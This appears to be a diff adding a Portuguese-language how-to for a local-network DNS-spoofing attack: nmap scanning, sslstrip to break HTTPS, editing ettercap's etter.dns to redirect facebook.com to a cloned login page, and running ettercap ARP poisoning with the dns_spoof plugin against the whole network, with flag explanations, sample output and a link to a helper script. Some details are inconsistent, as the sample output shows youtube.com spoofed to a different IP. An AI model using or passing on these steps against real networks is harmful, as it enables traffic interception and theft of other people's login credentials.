@@ -1,0 +1,51 @@
+﻿OBS Antes de efetuar esse ataque eh de extrema importancia scaniar
+com o nmap a fim de saber os navegadores e hosts vulneraveis,
+e entao rodar o SSLSTRIP primeiramente para quebrar os protocolos
+https e enfim efetuar este ataque. Eh recomendado fazer testes
+antes de atuar pois assim poderemos aperfeicoar o ataque.
+
+Se tudo estiver pronto antes de rodar o cat no sslstrip iniciamos
+o ataque dns spoof com o ettercap.
+
+
+nano /etc/ettercap/etter.dns
+
+Edite o final do arquivo inserindo os sites que quer redirecionar
+
+www.facebook.com   A 192.168.1.2
+facebook.com   A 192.168.1.2
+
+A= Tipo de Redirecionamento DNS
+
+o ip seria um clone do facebook na rede.
+
+apos editar e salvar o arquivo rodamos o ataque
+
+ettercap -T -q -M arp -i wlan0 -P dns_spoof ///
+
+Explicação
+ettercap: Comando da ferramenta utilizada.
+-T: Utiliza modo texto.
+-q: Seta o modo silencioso.
+-M arp: Tipo de redirecionamento.
+-i wlan0: Interface de rede.
+-P dns_spoof: Plugin utilizado para o ataque.
+/// :  Seleciona toda rede.
+
+
+Lembrando que tem que ver a barrinha 
+
+* |==================================================>| 100.00 %
+
+em andamento 
+
+dns_spoof: A [www.youtube.com] spoofed to [192.168.1.3]
+
+este eh o resultado de alguem tentando acessar o facebook.
+
+git clone https://github.com/cr1pt0n/dnsSCAN.git
+
+wget https://github.com/cr1pt0n/dnsSCAN.git
+
+esse arquivo é um script de ScanDNS
+Muito Bom para ser usado antes de um attaque de redirecionamento com Ettercap.
